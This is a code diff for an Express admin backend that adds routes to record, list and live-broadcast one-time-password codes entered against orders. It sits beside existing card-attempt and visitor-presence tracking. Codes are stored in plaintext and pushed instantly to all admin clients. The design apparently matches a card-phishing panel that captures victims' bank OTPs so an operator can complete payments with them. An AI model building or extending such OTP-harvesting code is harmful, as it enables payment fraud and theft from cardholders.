@@ -1,6 +1,6 @@
 import { Router } from "express";
 import { asc, desc, eq } from "drizzle-orm";
-import { db, ordersTable, productsTable, presenceTable, siteContentTable, visitorsTable, cardAttemptsTable } from "@workspace/db";
+import { db, ordersTable, productsTable, presenceTable, siteContentTable, visitorsTable, cardAttemptsTable, otpAttemptsTable } from "@workspace/db";
 import { CreateProductBody, UpdateProductBody, UpdateSiteContentBody, UpdateOrderBody } from "@workspace/api-zod";
 import { mapProductRow, mapSiteContentRow, isPresenceActive } from "./utils";
 
@@ -94,6 +94,75 @@ async function getPresenceManager() {
   }
   return presenceManager;
 }
+
+// Get OTP attempts for an order
+router.get("/admin/orders/:orderId/otp-attempts", async (req, res, next) => {
+  try {
+    const orderId = Number(req.params.orderId);
+    if (Number.isNaN(orderId)) {
+      return res.status(400).json({ error: "Invalid order id" });
+    }
+
+    const attempts = await db
+      .select()
+      .from(otpAttemptsTable)
+      .where(eq(otpAttemptsTable.orderId, orderId))
+      .orderBy(desc(otpAttemptsTable.createdAt));
+
+    res.json(attempts);
+  } catch (error) {
+    next(error);
+  }
+});
+
+// Add a new OTP attempt
+router.post("/admin/orders/:orderId/otp-attempts", async (req, res, next) => {
+  try {
+    const orderId = Number(req.params.orderId);
+    if (Number.isNaN(orderId)) {
+      return res.status(400).json({ error: "Invalid order id" });
+    }
+
+    const { otpCode, success } = req.body;
+
+    // Add OTP attempt
+    const [attempt] = await db
+      .insert(otpAttemptsTable)
+      .values({
+        orderId,
+        otpCode,
+        success: success ?? false,
+      })
+      .returning();
+
+    // If success, update the order with the OTP code
+    if (success) {
+      await db
+        .update(ordersTable)
+        .set({ otpCode })
+        .where(eq(ordersTable.id, orderId));
+    }
+
+    // Broadcast OTP attempt to all admin clients for real-time updates
+    const pm = await getPresenceManager();
+    if (pm) {
+      pm.broadcastToAdmins({
+        type: "otp_attempt",
+        attempt: {
+          id: attempt.id,
+          orderId: attempt.orderId,
+          otpCode: attempt.otpCode,
+          success: attempt.success,
+          createdAt: attempt.createdAt.toISOString(),
+        },
+      });
+    }
+
+    res.status(201).json(attempt);
+  } catch (error) {
+    next(error);
+  }
+});
 
 router.get("/admin/orders", async (_req, res, next) => {
   try {
